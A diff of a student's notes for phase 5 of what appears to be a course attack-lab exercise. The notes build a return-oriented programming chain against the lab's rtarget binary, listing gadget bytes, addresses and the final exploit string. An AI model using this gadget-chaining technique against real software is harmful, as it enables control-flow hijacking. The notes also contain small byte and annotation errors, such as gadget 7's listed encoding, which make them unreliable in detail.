@@ -405,159 +405,78 @@ NICE JOB!
 //                                              Phase 5                                               //
 ////////////////////////////////////////////////////////////////////////////////////////////////////////
 
-Gadget 1:
-movq %rsp, %rax // Byte representation: “48 89 e0”
-
-// There are 7 instances between start_farm and end_farm that has this:
-000000000040193d <addval_407>:
-  40193d:	8d 87 48 89 e0 91    	lea    -0x6e1f76b8(%rdi),%eax
-  401943:	c3                   	retq   
-
-000000000040199a <setval_283>:
-  40199a:	c7 07 48 89 e0 c1    	movl   $0xc1e08948,(%rdi)
-  4019a0:	c3                   	retq   
-
-00000000004019a8 <addval_286>:
-  4019a8:	8d 87 48 89 e0 c3    	lea    -0x3c1f76b8(%rdi),%eax
-  4019ae:	c3                   	retq   
-
-00000000004019cb <getval_321>:
-  4019cb:	b8 48 89 e0 91       	mov    $0x91e08948,%eax
-  4019d0:	c3                   	retq   
-
-00000000004019d8 <getval_220>:
-  4019d8:	b8 48 89 e0 c3       	mov    $0xc3e08948,%eax
-  4019dd:	c3                   	retq   
-
-00000000004019de <setval_290>:
-  4019de:	c7 07 48 89 e0 c7    	movl   $0xc7e08948,(%rdi)
-  4019e4:	c3                   	retq   
-
-00000000004019e5 <getval_486>:
-  4019e5:	b8 48 89 e0 c1       	mov    $0xc1e08948,%eax
-  4019ea:	c3                   	retq   
+8 gadgets to get and its byte representation:
+pop %rax                 // 58
+mov %eax, %ecx           // 89 c1
+mov %ecx, %edx           // 89 ca
+mov %edx, %esi           // 89 d6
+mov %rsp, %rax           // 48 89 e0
+mov %rax, %rdi           // 48 89 c7
+lea (%rdi,%rsi,1), %rax  // 48 8d 94 37
+mov %rax, %rdi           // 48 89 c7
 
 
-// But there are only 2 that move a value into %rdi:
-000000000040199a <setval_283>:
-  40199a:	c7 07 48 89 e0 c1    	movl   $0xc1e08948,(%rdi)
-  4019a0:	c3                   	retq   
+Gadget 1: find “58”
+  401909:        8d 87 c1 58 90 c3            lea    -0x3c6fa73f(%rdi),%eax 
+  // “90" is nops. Address in little endian: 0c 19 40 00 00 00 00 00
 
-00000000004019de <setval_290>:
-  4019de:	c7 07 48 89 e0 c7    	movl   $0xc7e08948,(%rdi)
-  4019e4:	c3                   	retq   
+Gadget 2: find “89 c1”
+  40195f:        8d 87 89 c1 90 c2            lea    -0x3d6f3e77(%rdi),%eax
+  // “c2” is not a nop, so wouldn’t work
+  401973:        b8 89 c1 38 c0               mov    $0xc038c189,%eax
+  // "38 c0" is a nop: cmpb %al, %al. Address in little endian: 74 19 40 00 00 00 00 00
 
-40199a + 2 = 40199c
-4019de + 2 = 4019e0
+Gadget 3: find “89 ca”
+  40194a:        c7 07 89 ca 20 c9            movl   $0xc920ca89,(%rdi)
+  // "20 c9" is a nop: andb %al, %al. Address in little endian: 4c 19 40 00 00 00 00 00
 
-Less likely to be:
-40193d + 2 = 40193f
-4019a8 + 2 = 4019aa
-4019cb + 1 = 4019cc
-4019d8 + 1 = 4019d9
-4019e5 + 1 = 4019e6
+Gadget 4: find “89 d6”
+  401958:        c7 07 89 d6 30 c9            movl   $0xc930d689,(%rdi)
+  // "30 c9" is not a nop, so wouldn’t work
+  401986:        b8 89 d6 08 c9               mov    $0xc908d689,%eax
+  // "08 c9" is a nop: orb %cl, %cl. Address in little endian: 87 19 40 00 00 00 00 00
 
-// gadget 2 needs to include adding something to register %al, which is “04” and then some random number.
-// In this case, it’s “add 0x37, %al”
-0000000000401938 <add_xy>:
-  401938:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
-  40193c:	c3                   	retq   
+Gadget 5: find “48 89 e0”
+  40199a:        c7 07 48 89 e0 c1            movl   $0xc1e08948,(%rdi)
+  // “c1” is not a nop, so wouldn’t work
+  4019a8:        8d 87 48 89 e0 c3            lea    -0x3c1f76b8(%rdi),%eax
+  // immediately ends with c3. Address in little endian: aa 19 40 00 00 00 00 00
 
+Gadget 6: find “48 89 c7”
+  401916:        c7 07 48 89 c7 c1            movl   $0xc1c78948,(%rdi)
+  // c1 is not a nop, so wouldn’t work
+  401902:        8d 87 48 89 c7 c3            lea    -0x3c3876b8(%rdi),%eax
+  // immediately ends with c3. Address in little endian: 04 19 40 00 00 00 00 00
 
-// gadget 3 needs to include “mov %rax, %rdi” which is represented as byte sequence “48 89 c7”,
-// which are found in 4 instances:
-00000000004018fb <addval_432>:
-  4018fb:	8d 87 48 89 c7 c7    	lea    -0x383876b8(%rdi),%eax
-  401901:	c3                   	retq   
+Gadget 7: find “48 8d 94 37”
+  401938:        48 8d 04 37                  lea    (%rdi,%rsi,1),%rax
+  // immediately ends with c3. Address in little endian: 38 19 40 00 00 00 00 00
 
-0000000000401902 <addval_153>:
-  401902:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
-  401908:	c3                   	retq   
-
-0000000000401916 <setval_359>:
-  401916:	c7 07 48 89 c7 c1    	movl   $0xc1c78948,(%rdi)
-  40191c:	c3                   	retq   
-
-000000000040192b <addval_406>:
-  40192b:	8d 87 26 48 89 c7    	lea    -0x3876b7da(%rdi),%eax
-  401931:	c3                   	retq   
+Gadget 8: find “48 89 c7”, same as gadget 6
+  401902:        8d 87 48 89 c7 c3            lea    -0x3c3876b8(%rdi),%eax
+  // immediately ends with c3. Address in little endian: 04 19 40 00 00 00 00 00
 
 
-// But only 2 of these move values from %eax to %rdi:
-00000000004018fb <addval_432>:
-  4018fb:	8d 87 48 89 c7 c7    	lea    -0x383876b8(%rdi),%eax
-  401901:	c3                   	retq   
-
-0000000000401902 <addval_153>:
-  401902:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
-  401908:	c3                   	retq   
-
-// To conclude:
-gadget 1 can be:
-40199a + 2 = 40199c
-4019de + 2 = 4019e0
-
-Less likely to be:
-40193d + 2 = 40193f // maybe
-4019a8 + 2 = 4019aa // maybe
-4019cb + 1 = 4019cc // maybe
-4019d8 + 1 = 4019d9 // maybe
-4019e5 + 1 = 4019e6
-
-gadget 2 can be:
-401938 + 2 = 40193a
-
-gadget 3 can be:
-4018fb + 2 = 4018fd // maybe
-401902 + 2 = 401904 // maybe
-
-Less likely to be:
-401916 + 2 = 401918
-40192b + 3 = 40192d // maybe
-
-touch3 address:
-40186d 
-
-// The exploit string should be:
+The exploit string should be:
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00 // 56 bytes of padding
-9c 19 40 00 00 00 00 00 // gadget 1
-3a 19 40 00 00 00 00 00 // gadget 2
-fd 18 40 00 00 00 00 00 // gadget 3
-6d 18 40 00 00 00 00 00 // touch3 function address
-00 00 00 00 00 00 00 00 // another 56 bytes of padding, including cookie
-00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00
-34 65 39 39 63 62 31 62 // cookie in text format, instead of hex, just like in phase 3
+00 00 00 00 00 00 00 00 /* 56 bytes of padding */
+0c 19 40 00 00 00 00 00 /* gadget 1 */
+20 00 00 00 00 00 00 00 /* offset */
+74 19 40 00 00 00 00 00 /* gadget 2 */
+4c 19 40 00 00 00 00 00 /* gadget 3 */
+87 19 40 00 00 00 00 00 /* gadget 4 */
+aa 19 40 00 00 00 00 00 /* gadget 5 */
+04 19 40 00 00 00 00 00 /* gadget 6 */
+38 19 40 00 00 00 00 00 /* gadget 7 */
+04 19 40 00 00 00 00 00 /* gadget 8 */
+6d 18 40 00 00 00 00 00 /* touch3 function address */
+34 65 39 39 63 62 31 62 /* cookie in text format, instead of hex, just like in phase 3 */
 
-[jieyun@lnxsrv09 ~/target164]$ ./hex2raw < phase5.txt > raw-phase5.txt
-[jieyun@lnxsrv09 ~/target164]$ ./rtarget < raw-phase5.txt
-
-Try:
-40199c, 40193a, 4018fd // Oops!: You executed an illegal instruction
-40199c, 40193a, 401904 // Oops!: You executed an illegal instruction
-4019e0, 40193a, 4018fd // Oops!: You executed an illegal instruction
-4019e0, 40193a, 401904 // Oops!: You executed an illegal instruction
-
-Check gadget 1:
-40193f, 40193a, 4018fd // Ouch!: You caused a segmentation fault!
-4019aa,                // Ouch!: You caused a segmentation fault!
-4019cc,                // Ouch!: You caused a segmentation fault!
-4019d9,                // Ouch!: You caused a segmentation fault!
-4019e6,                // Oops!: You executed an illegal instruction
-
-Check gadget 3:
-40193f, 40193a, 4018fd // Ouch!: You caused a segmentation fault!
-40193f, 40193a, 401904 // Ouch!: You caused a segmentation fault!
-40193f, 40193a, 401918 // Oops!: You executed an illegal instruction
-40193f, 40193a, 40192d // Ouch!: You caused a segmentation fault!
-
+./hex2raw < phase5.txt > raw-phase5.txt
+./rtarget < raw-phase5.txt
 
